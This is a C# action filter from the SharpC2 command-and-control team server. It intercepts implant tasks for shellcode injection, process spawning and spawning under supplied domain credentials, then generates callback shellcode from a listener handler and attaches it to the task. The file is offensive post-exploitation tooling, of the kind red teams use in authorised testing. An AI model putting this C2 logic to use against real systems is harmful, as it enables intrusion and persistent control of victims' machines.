using Microsoft.AspNetCore.Mvc.Filters;

using SharpC2.API.Request;

using TeamServer.Controllers;
using TeamServer.Handlers;
using TeamServer.Interfaces;

namespace TeamServer.Filters;

public sealed class InjectionFilters : IAsyncActionFilter
{
    private readonly IHandlerService _handlers;
    private readonly IPayloadService _payloads;

    public InjectionFilters(IHandlerService handlers, IPayloadService payloads)
    {
        _handlers = handlers;
        _payloads = payloads;
    }

    public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next)
    {
        if (context.Controller is TasksController)
        {
            if (context.ActionArguments.TryGetValue("request", out var action))
            {
                if (action is DroneTaskRequest taskRequest)
                {
                    // shinject
                    if (taskRequest.Command == 0x17)
                    {
                        // if no shellcode is in the task, assume args were:
                        // args[0] == pid
                        // args[1] == handler
                        if (taskRequest.Artefact.Length == 0)
                        {
                            var handler = _handlers.GetHandler<Handler>(taskRequest.Arguments[1]);
                            
                            if (handler is null)
                                throw new ArgumentException("Handler not found");

                            // generate shellcode
                            taskRequest.Artefact = await _payloads.GeneratePayload(handler, PayloadFormat.Shellcode);
                            
                            // remove handler from task
                            taskRequest.Arguments = taskRequest.Arguments.SkipLast(1).ToArray();
                        }
                    }
                    
                    // shspawn
                    if (taskRequest.Command == 0x18)
                    {
                        // args[0] == handler
                        var handler = _handlers.GetHandler<Handler>(taskRequest.Arguments[0]);
                            
                        if (handler is null)
                            throw new ArgumentException("Handler not found");
                        
                        // generate shellcode
                        taskRequest.Artefact = await _payloads.GeneratePayload(handler, PayloadFormat.Shellcode);
                            
                        // remove handler from task
                        taskRequest.Arguments = taskRequest.Arguments.Skip(1).ToArray();
                    }

                    // spawnas
                    if (taskRequest.Command == 0x19)
                    {
                        // args[0] == DOMAIN\\username
                        // args[1] == password
                        // args[2] == handler
                        
                        var handler = _handlers.GetHandler<Handler>(taskRequest.Arguments[2]);
                            
                        if (handler is null)
                            throw new ArgumentException("Handler not found");
                        
                        // generate shellcode
                        taskRequest.Artefact = await _payloads.GeneratePayload(handler, PayloadFormat.Shellcode);
                            
                        // remove handler from task
                        taskRequest.Arguments = taskRequest.Arguments.SkipLast(1).ToArray();
                    }
                }
            }
        }

        // go to next
        await next();
    }
}